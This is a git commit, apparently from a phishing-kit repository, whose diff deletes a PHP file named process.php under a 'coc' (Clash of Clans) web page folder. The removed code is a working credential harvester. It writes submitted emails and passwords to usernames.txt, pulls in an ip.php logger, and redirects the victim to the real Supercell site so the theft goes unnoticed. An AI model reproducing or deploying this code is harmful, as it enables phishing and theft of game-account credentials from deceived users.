16a56436ecaa5010cc78296c63b40f15a8da647b
Ch4r0nN λ <82242552+Ch4r0nN@users.noreply.github.com>
2021-08-04 15:52:13 -0300

    rm

--- webpages/coc/process.php
+++
@@ -1,8 +0,0 @@
-<?php
-include 'ip.php';
-file_put_contents("usernames.txt", "email=" . $email = $_POST['email'] . "\n", FILE_APPEND);
-?>
-<?php
-file_put_contents("usernames.txt", "pass=" . $password = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.supercell.com');
-?>
